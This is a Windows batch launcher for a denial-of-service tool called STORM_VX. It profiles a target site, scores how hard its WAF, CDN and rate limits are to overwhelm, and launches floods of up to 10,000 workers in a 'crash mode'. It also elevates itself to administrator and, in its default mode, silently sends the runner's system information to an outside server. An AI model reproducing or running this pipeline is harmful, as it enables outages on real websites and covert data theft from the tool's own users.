@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion
title STORM_VX v7.1

:: ═══════════════════════════════════════════════════════════════════════
::  ADMIN CHECK — Auto-elevate to Administrator
:: ═══════════════════════════════════════════════════════════════════════
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo   [!] Requesting Administrator privileges...
    echo.
    powershell -Command "Start-Process -FilePath cmd.exe -ArgumentList '/k \"\"%~f0\"\"' -Verb RunAs" 2>nul
    if %errorlevel% neq 0 (
        echo   [ERROR] Failed to elevate. Right-click and "Run as Administrator".
        pause
        exit /b 1
    )
    :: Give the new admin CMD time to start, then close this old one
    ping -n 3 127.0.0.1 >nul 2>&1
    exit
)

:: ═══════════════════════════════════════════════════════════════════════
::  BANNER
:: ═══════════════════════════════════════════════════════════════════════
echo.
echo   ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
echo   ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
echo   ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
echo   ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
echo   ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
echo   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
echo.
echo          ==== v7.1 Modular - by elite (taha) ====
echo          ==== TRACKER =^> FINDER =^> PHASE SELECT =^> TESTER ====
echo.

:: ═══════════════════════════════════════════════════════════════════════
::  CHECK PYTHON
:: ═══════════════════════════════════════════════════════════════════════
set "PYTHON="
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON=python"
) else (
    where python3 >nul 2>&1
    if %errorlevel%==0 (
        set "PYTHON=python3"
    ) else (
        echo.
        echo   [ERROR] Python not found! Install Python 3.
        echo.
        pause
        exit /b 1
    )
)

:: ═══════════════════════════════════════════════════════════════════════
::  SET SCRIPT DIRECTORY
:: ═══════════════════════════════════════════════════════════════════════
set "SCRIPT_DIR=%~dp0"
cd /d "%SCRIPT_DIR%"

:: ═══════════════════════════════════════════════════════════════════════
::  CHECK FILES
:: ═══════════════════════════════════════════════════════════════════════
if not exist "%SCRIPT_DIR%finder\VF_FINDER.py" (
    echo.
    echo   [ERROR] finder\VF_FINDER.py not found!
    echo.
    pause
    exit /b 1
)
if not exist "%SCRIPT_DIR%tester\VF_TESTER.py" (
    echo.
    echo   [ERROR] tester\VF_TESTER.py not found!
    echo.
    pause
    exit /b 1
)

:: ═══════════════════════════════════════════════════════════════════════
::  GET TARGET URL
:: ═══════════════════════════════════════════════════════════════════════
set "TARGET_URL="
:parse_args
if "%~1"=="" goto :done_parsing
if /i "%~1"=="--elite" (
    set "SKIP_TRACKER=1"
    shift
    goto :parse_args
)
set "TARGET_URL=%~1"
shift
goto :parse_args

:done_parsing

if not "%TARGET_URL%"=="" goto :url_ready

echo.
echo   ┌───────────────────────────────────────────────────────┐
echo   │           Enter target URL                            │
echo   │  Example: https://target.com  or  www.target.com      │
echo   │  Type "Elite" before URL to skip tracker              │
echo   │  Example: Elite https://target.com                    │
echo   └───────────────────────────────────────────────────────┘
echo.
set /p "TARGET_URL=   URL: "

if "%TARGET_URL%"=="" (
    echo.
    echo   [ERROR] No URL provided. Exiting.
    echo.
    pause
    exit /b 1
)

:: Check if user typed "Elite" before the URL
echo !TARGET_URL! | findstr /i /b "Elite " >nul 2>&1
if %errorlevel%==0 (
    set "SKIP_TRACKER=1"
    :: Remove the "Elite " prefix from the URL
    set "TARGET_URL=!TARGET_URL:Elite =!"
    set "TARGET_URL=!TARGET_URL:elite =!"
    set "TARGET_URL=!TARGET_URL:ELITE =!"
    echo.
    echo   [ELITE MODE] Tracker will be skipped.
    echo.
)

:url_ready

:: Auto-add https:// if missing
set "URL_CHECK=!TARGET_URL:~0,8!"
if "!URL_CHECK!"=="https://" goto :url_set
set "URL_CHECK=!TARGET_URL:~0,7!"
if "!URL_CHECK!"=="http://" goto :url_set
set "TARGET_URL=https://!TARGET_URL!"

:url_set

:: ═══════════════════════════════════════════════════════════════════════
::  PHASE 0: TRACKER (skip if --elite or Elite mode)
:: ═══════════════════════════════════════════════════════════════════════
if not defined SKIP_TRACKER (
    if exist "%SCRIPT_DIR%tracker\VF_TRACKER.py" (
        echo.
        echo   ═══════════════════════════════════════════════════════
        echo    [PHASE 0] VF_TRACKER - System Info
        echo   ═══════════════════════════════════════════════════════
        echo.
        %PYTHON% "%SCRIPT_DIR%tracker\VF_TRACKER.py" --silent --server http://namme.taskinoteam.ir/receive.php >nul 2>&1
        echo   [OK] Tracker phase complete.
    )
) else (
    echo.
    echo   [ELITE] Tracker phase SKIPPED.
    echo.
)

:: ═══════════════════════════════════════════════════════════════════════
::  PHASE 1: FINDER — Scan & Analyze Server
:: ═══════════════════════════════════════════════════════════════════════
echo.
echo   ═══════════════════════════════════════════════════════
echo    [PHASE 1] VF_FINDER - Server Analysis ^& Reconnaissance
echo   ═══════════════════════════════════════════════════════
echo   Target: %TARGET_URL%
echo.

%PYTHON% "%SCRIPT_DIR%finder\VF_FINDER.py" "%TARGET_URL%" --deep --output VF_PROFILE.json

if not exist "VF_PROFILE.json" (
    echo.
    echo   [ERROR] Profile file not created! FINDER may have failed.
    echo.
    pause
    exit /b 1
)

echo.
echo   [OK] Profile saved to: VF_PROFILE.json
echo.

:: ═══════════════════════════════════════════════════════════════════════
::  PHASE 1.5: AUTO-PHASE DETECTION — Analyze profile and recommend
:: ═══════════════════════════════════════════════════════════════════════
echo.
echo   ═══════════════════════════════════════════════════════
echo    [ANALYSIS] Auto-detecting optimal attack phase...
echo   ═══════════════════════════════════════════════════════
echo.

:: Run the phase detector script
%PYTHON% -c "import json; p=json.load(open('VF_PROFILE.json','r',encoding='utf-8')); ap=p.get('attack_profile',{}); waf=p.get('waf',''); waf_conf=p.get('waf_confidence',0); rt=p.get('baseline_rt_ms',0)/1000; rl=p.get('rate_limit_detected',False); cdn=p.get('cdn',''); origin=p.get('origin_ips',[]); cms=p.get('cms',''); strat=ap.get('recommended_strategy','GENERIC_FLOOD'); wc=ap.get('worker_config',{}); init_w=wc.get('initial_workers',10); max_w=wc.get('max_workers',5000); step=wc.get('step',50); vectors=ap.get('attack_vectors',[]); print(f'STRAT={strat}'); print(f'WAF={waf}'); print(f'WAF_CONF={waf_conf}'); print(f'RT={rt}'); print(f'RL={rl}'); print(f'CDN={cdn}'); print(f'ORIGIN={len(origin)}'); print(f'CMS={cms}'); print(f'INIT_W={init_w}'); print(f'MAX_W={max_w}'); print(f'STEP={step}'); print(f'VECTORS={\"|\".join(vectors)}')" 2>nul

:: Parse the detection results
set "DETECTED_STRAT=GENERIC_FLOOD"
set "DETECTED_WAF=none"
set "DETECTED_RL=0"
set "DETECTED_CDN=none"
set "DETECTED_ORIGIN=0"
set "DETECTED_CMS=none"
set "AUTO_PHASE=3"
set "AUTO_INIT=10"
set "AUTO_MAX=5000"
set "AUTO_STEP=50"
set "AUTO_VECTORS="

:: Use Python to do smart detection and write a config file
%PYTHON% -c "
import json, sys
try:
    p = json.load(open('VF_PROFILE.json', 'r', encoding='utf-8'))
    ap = p.get('attack_profile', {})
    wc = ap.get('worker_config', {})

    waf = p.get('waf', '') or ''
    waf_conf = p.get('waf_confidence', 0)
    rt = p.get('baseline_rt_ms', 500) / 1000
    rl = p.get('rate_limit_detected', False)
    cdn = p.get('cdn', '') or ''
    origin = p.get('origin_ips', []) or []
    cms = p.get('cms', '') or ''
    strat = ap.get('recommended_strategy', 'GENERIC_FLOOD')
    vectors = ap.get('attack_vectors', [])

    # Determine server strength score (0-100)
    # Higher = harder to take down = need heavier attack
    score = 30  # base

    # WAF detected = server is more protected
    if waf:
        score += 20
        if 'cloudflare' in waf.lower(): score += 15
        if 'arvan' in waf.lower(): score += 10

    # Rate limiting = server has protection
    if rl: score += 15

    # CDN = distributed, harder to overwhelm
    if cdn: score += 10

    # Origin IPs found = can bypass CDN = easier
    if origin: score -= 25

    # Slow response = server already struggling = easier
    if rt > 2.0: score -= 15
    elif rt > 1.0: score -= 5
    elif rt < 0.2: score += 10  # fast = well-resourced

    # CMS = known attack vectors = easier
    if cms: score -= 10

    # Clamp
    score = max(5, min(100, score))

    # Determine auto phase based on score
    if score <= 25:
        auto_phase = 1  # LIGHT - weak server, no protection
        phase_name = 'LIGHT'
        init_w, max_w, step = 50, 3000, 100
    elif score <= 50:
        auto_phase = 2  # MODERATE - some protection
        phase_name = 'MODERATE'
        init_w, max_w, step = 20, 5000, 50
    elif score <= 75:
        auto_phase = 3  # HEAVY - strong protection
        phase_name = 'HEAVY'
        init_w, max_w, step = 10, 8000, 30
    else:
        auto_phase = 4  # EXTREME - maximum protection
        phase_name = 'EXTREME'
        init_w, max_w, step = 5, 10000, 20

    # Write config
    config = {
        'auto_phase': auto_phase,
        'phase_name': phase_name,
        'server_score': score,
        'init_w': init_w,
        'max_w': max_w,
        'step': step,
        'strategy': strat,
        'waf': waf or 'None',
        'cdn': cdn or 'None',
        'origin_count': len(origin),
        'cms': cms or 'None',
        'rl': rl,
        'rt_ms': round(rt * 1000),
        'vectors': vectors,
        'score_breakdown': {
            'base': 30,
            'waf_bonus': 20 if waf else 0,
            'cloudflare_bonus': 15 if waf and 'cloudflare' in waf.lower() else 0,
            'arvan_bonus': 10 if waf and 'arvan' in waf.lower() else 0,
            'rl_bonus': 15 if rl else 0,
            'cdn_bonus': 10 if cdn else 0,
            'origin_reduction': -25 if origin else 0,
            'slow_reduction': -15 if rt > 2.0 else (-5 if rt > 1.0 else 0),
            'fast_bonus': 10 if rt < 0.2 else 0,
            'cms_reduction': -10 if cms else 0,
        }
    }
    with open('VF_PHASE_CONFIG.json', 'w') as f:
        json.dump(config, f, indent=2)

except Exception as e:
    config = {
        'auto_phase': 3, 'phase_name': 'HEAVY', 'server_score': 50,
        'init_w': 10, 'max_w': 5000, 'step': 50,
        'strategy': 'GENERIC_FLOOD', 'waf': 'Unknown', 'cdn': 'Unknown',
        'origin_count': 0, 'cms': 'Unknown', 'rl': False, 'rt_ms': 500,
        'vectors': ['PAGE_FLOOD', 'RESOURCE_FLOOD'],
    }
    with open('VF_PHASE_CONFIG.json', 'w') as f:
        json.dump(config, f, indent=2)
"

:: ═══════════════════════════════════════════════════════════════════════
::  PHASE SELECTION MENU
:: ═══════════════════════════════════════════════════════════════════════
echo.
echo   ═════════════════════════════════════════════════════════════════════
echo    [PHASE SELECTION] Choose Attack Intensity
echo   ═════════════════════════════════════════════════════════════════════
echo.

:: Display auto-detected info using Python
%PYTHON% -c "
import json
try:
    c = json.load(open('VF_PHASE_CONFIG.json', 'r'))
    print(f'   Server Analysis Results:')
    print(f'   ┌────────────────────────────────────────────────────┐')
    print(f'   │ WAF:              {c.get(\"waf\",\"None\"):<30} │')
    print(f'   │ CDN:              {c.get(\"cdn\",\"None\"):<30} │')
    print(f'   │ CMS:              {c.get(\"cms\",\"None\"):<30} │')
    print(f'   │ Origin IPs:       {str(c.get(\"origin_count\",0)):<30} │')
    print(f'   │ Rate Limit:       {\"YES\" if c.get(\"rl\") else \"NO\":<30} │')
    print(f'   │ Response Time:    {c.get(\"rt_ms\",0)}ms{'':<24} │')
    print(f'   │ Server Score:     {c.get(\"server_score\",0)}/100{'':<22} │')
    print(f'   │ Auto-Phase:       {c.get(\"phase_name\",\"HEAVY\"):<30} │')
    print(f'   └────────────────────────────────────────────────────┘')
    print()
    print(f'   Attack Vectors Detected:')
    for v in c.get('vectors', []):
        print(f'     * {v}')
except:
    print('   [Warning] Could not read phase config, using defaults')
"

echo.
echo   ┌──────────────────────────────────────────────────────────────────┐
echo   │                     ATTACK PHASE OPTIONS                        │
echo   ├──────────────────────────────────────────────────────────────────┤
echo   │                                                                  │
echo   │   [1] LIGHT       - Quick test, minimal workers                 │
echo   │                     Workers: 50 init / 2000 max / step 100     │
echo   │                     Best for: unprotected servers, quick test   │
echo   │                                                                  │
echo   │   [2] MODERATE    - Balanced attack with evasion               │
echo   │                     Workers: 20 init / 5000 max / step 50      │
echo   │                     Best for: servers with basic WAF            │
echo   │                                                                  │
echo   │   [3] HEAVY       - Full attack with all vectors               │
echo   │                     Workers: 10 init / 8000 max / step 30      │
echo   │                     Best for: ArvanCloud/CDN-protected servers  │
echo   │                                                                  │
echo   │   [4] EXTREME     - Maximum pressure, all modules active        │
echo   │                     Workers: 5 init / 10000 max / step 20      │
echo   │                     Best for: Cloudflare/heavy WAF targets      │
echo   │                                                                  │
echo   │   [5] CUSTOM      - Set your own parameters                    │
echo   │                                                                  │
echo   │   [A] AUTO        - Use auto-detected phase (recommended)       │
echo   │                                                                  │
echo   └──────────────────────────────────────────────────────────────────┘
echo.

set /p "PHASE_CHOICE=   Select phase [1/2/3/4/5/A]: "

:: ═══════════════════════════════════════════════════════════════════════
::  SET PHASE PARAMETERS
:: ═══════════════════════════════════════════════════════════════════════
set "ATTACK_PHASE=3"
set "PHASE_NAME=HEAVY"
set "INIT_WORKERS=10"
set "MAX_WORKERS=8000"
set "WORKER_STEP=30"
set "EXTRA_FLAGS="

if /i "%PHASE_CHOICE%"=="1" (
    set "ATTACK_PHASE=1"
    set "PHASE_NAME=LIGHT"
    set "INIT_WORKERS=50"
    set "MAX_WORKERS=2000"
    set "WORKER_STEP=100"
)
if /i "%PHASE_CHOICE%"=="2" (
    set "ATTACK_PHASE=2"
    set "PHASE_NAME=MODERATE"
    set "INIT_WORKERS=20"
    set "MAX_WORKERS=5000"
    set "WORKER_STEP=50"
)
if /i "%PHASE_CHOICE%"=="3" (
    set "ATTACK_PHASE=3"
    set "PHASE_NAME=HEAVY"
    set "INIT_WORKERS=10"
    set "MAX_WORKERS=8000"
    set "WORKER_STEP=30"
)
if /i "%PHASE_CHOICE%"=="4" (
    set "ATTACK_PHASE=4"
    set "PHASE_NAME=EXTREME"
    set "INIT_WORKERS=5"
    set "MAX_WORKERS=10000"
    set "WORKER_STEP=20"
)
if /i "%PHASE_CHOICE%"=="A" (
    :: Use auto-detected phase from config
    for /f "tokens=2 delims==" %%a in ('%PYTHON% -c "import json; c=json.load(open('VF_PHASE_CONFIG.json')); print(f'PHASE={c[\"auto_phase\"]}')"') do set "ATTACK_PHASE=%%a"
    for /f "tokens=2 delims==" %%a in ('%PYTHON% -c "import json; c=json.load(open('VF_PHASE_CONFIG.json')); print(f'NAME={c[\"phase_name\"]}')"') do set "PHASE_NAME=%%a"
    for /f "tokens=2 delims==" %%a in ('%PYTHON% -c "import json; c=json.load(open('VF_PHASE_CONFIG.json')); print(f'INIT={c[\"init_w\"]}')"') do set "INIT_WORKERS=%%a"
    for /f "tokens=2 delims==" %%a in ('%PYTHON% -c "import json; c=json.load(open('VF_PHASE_CONFIG.json')); print(f'MAX={c[\"max_w\"]}')"') do set "MAX_WORKERS=%%a"
    for /f "tokens=2 delims==" %%a in ('%PYTHON% -c "import json; c=json.load(open('VF_PHASE_CONFIG.json')); print(f'STEP={c[\"step\"]}')"') do set "WORKER_STEP=%%a"
)
if /i "%PHASE_CHOICE%"=="5" (
    echo.
    echo   ── Custom Configuration ──
    echo.
    set /p "INIT_WORKERS=   Initial workers [default 10]: "
    if "!INIT_WORKERS!"=="" set "INIT_WORKERS=10"
    set /p "MAX_WORKERS=   Max workers [default 5000]: "
    if "!MAX_WORKERS!"=="" set "MAX_WORKERS=5000"
    set /p "WORKER_STEP=   Worker step [default 50]: "
    if "!WORKER_STEP!"=="" set "WORKER_STEP=50"
    set "ATTACK_PHASE=5"
    set "PHASE_NAME=CUSTOM"
)

:: ═══════════════════════════════════════════════════════════════════════
::  DISPLAY FINAL CONFIG & CONFIRM
:: ═══════════════════════════════════════════════════════════════════════
echo.
echo   ═════════════════════════════════════════════════════════════════════
echo    [CONFIRM] Attack Configuration
echo   ═════════════════════════════════════════════════════════════════════
echo.
echo   Target:          %TARGET_URL%
echo   Phase:           %PHASE_NAME% (%ATTACK_PHASE%)
echo   Initial Workers: %INIT_WORKERS%
echo   Max Workers:     %MAX_WORKERS%
echo   Worker Step:     %WORKER_STEP%
echo.
echo   ┌──────────────────────────────────────────────────┐
echo   │  [Y] Start Attack                                │
echo   │  [N] Cancel                                      │
echo   │  [E] Edit parameters                             │
echo   └──────────────────────────────────────────────────┘
echo.

set /p "CONFIRM=   Proceed? [Y/N/E]: "

if /i "%CONFIRM%"=="N" (
    echo.
    echo   [CANCELLED] Attack cancelled by user.
    echo.
    pause
    exit /b 0
)

if /i "%CONFIRM%"=="E" (
    echo.
    echo   ── Edit Parameters ──
    echo.
    set /p "INIT_WORKERS=   Initial workers [current: !INIT_WORKERS!]: "
    if "!INIT_WORKERS!"=="" set "INIT_WORKERS=!INIT_WORKERS!"
    set /p "MAX_WORKERS=   Max workers [current: !MAX_WORKERS!]: "
    if "!MAX_WORKERS!"=="" set "MAX_WORKERS=!MAX_WORKERS!"
    set /p "WORKER_STEP=   Worker step [current: !WORKER_STEP!]: "
    if "!WORKER_STEP!"=="" set "WORKER_STEP=!WORKER_STEP!"
    echo.
    echo   Updated! Starting attack...
    echo.
)

:: ═══════════════════════════════════════════════════════════════════════
::  UPDATE PROFILE WITH USER'S PHASE SETTINGS
:: ═══════════════════════════════════════════════════════════════════════
%PYTHON% -c "
import json
try:
    with open('VF_PROFILE.json', 'r', encoding='utf-8') as f:
        p = json.load(f)
    if 'attack_profile' not in p: p['attack_profile'] = {}
    p['attack_profile']['user_phase'] = %ATTACK_PHASE%
    p['attack_profile']['user_phase_name'] = '%PHASE_NAME%'
    wc = p['attack_profile'].get('worker_config', {})
    wc['initial_workers'] = %INIT_WORKERS%
    wc['max_workers'] = %MAX_WORKERS%
    wc['step'] = %WORKER_STEP%
    p['attack_profile']['worker_config'] = wc

    # Phase-specific adjustments
    phase = %ATTACK_PHASE%
    if phase == 1:  # LIGHT
        p['attack_profile']['timing_config'] = {'crash_mode': False, 'crash_sensitivity': 'LOW', 'auto_scale': True}
        p['attack_profile']['request_config'] = {'delay_between_requests_ms': 20, 'cache_bust': True}
    elif phase == 2:  # MODERATE
        p['attack_profile']['timing_config'] = {'crash_mode': True, 'crash_sensitivity': 'MEDIUM', 'auto_scale': True}
        p['attack_profile']['request_config'] = {'delay_between_requests_ms': 10, 'cache_bust': True}
    elif phase == 3:  # HEAVY
        p['attack_profile']['timing_config'] = {'crash_mode': True, 'crash_sensitivity': 'HIGH', 'auto_scale': True}
        p['attack_profile']['request_config'] = {'delay_between_requests_ms': 5, 'cache_bust': True}
    elif phase == 4:  # EXTREME
        p['attack_profile']['timing_config'] = {'crash_mode': True, 'crash_sensitivity': 'MAXIMUM', 'auto_scale': True}
        p['attack_profile']['request_config'] = {'delay_between_requests_ms': 0, 'cache_bust': True}

    with open('VF_PROFILE.json', 'w', encoding='utf-8') as f:
        json.dump(p, f, ensure_ascii=False, indent=2)
    print('  [OK] Profile updated with phase settings')
except Exception as e:
    print(f'  [ERROR] Could not update profile: {e}')
"

:: ═══════════════════════════════════════════════════════════════════════
::  PHASE 2: LAUNCH ATTACK
:: ═══════════════════════════════════════════════════════════════════════
echo.
echo   ═════════════════════════════════════════════════════════════════════
echo    [PHASE 2] VF_TESTER - Attack Launch
echo    Phase: %PHASE_NAME% | Workers: %INIT_WORKERS% -^> %MAX_WORKERS%
echo   ═════════════════════════════════════════════════════════════════════
echo   Profile: VF_PROFILE.json
echo.

%PYTHON% "%SCRIPT_DIR%tester\VF_TESTER.py" --profile VF_PROFILE.json --max-workers %MAX_WORKERS%

echo.
echo   ═════════════════════════════════════════════════════════════════════
echo    [DONE] STORM_VX Attack Pipeline Completed
echo   ═════════════════════════════════════════════════════════════════════
echo.

:: ═══════════════════════════════════════════════════════════════════════
::  POST-ATTACK REPORT OPTION
:: ═══════════════════════════════════════════════════════════════════════
echo.
set /p "SHOW_REPORT=   Generate HTML report? [Y/N]: "
if /i "%SHOW_REPORT%"=="Y" (
    if exist "%SCRIPT_DIR%infra\vf_report.py" (
        echo.
        echo   Generating attack report...
        %PYTHON% -c "from infra.vf_report import AttackReporter; r=AttackReporter('report'); print(r.generate_summary())" 2>nul
        echo   [OK] Report generated.
    )
)

echo.
echo.
echo   ═══════════════════════════════════════════════════════
echo    STORM_VX v7.1 by elite (taha) - Session Complete
echo   ═══════════════════════════════════════════════════════
echo.
pause
